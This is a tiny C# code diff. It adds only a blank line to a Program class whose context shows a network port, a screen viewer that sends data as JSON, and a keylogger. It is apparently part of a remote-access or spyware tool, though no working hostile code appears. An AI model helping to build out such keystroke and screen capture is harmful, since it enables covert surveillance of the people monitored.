@@ -17,6 +17,7 @@ class Program
     static readonly int Port = Config.Port;
     static readonly int bufferSize = Config.BufferSize;
     #endregion
+
     #region Features
     static ScreenViewer screenViewer = new ScreenViewer(bufferSize, SendJson);
     static KeyLogger keyLogger = new KeyLogger();
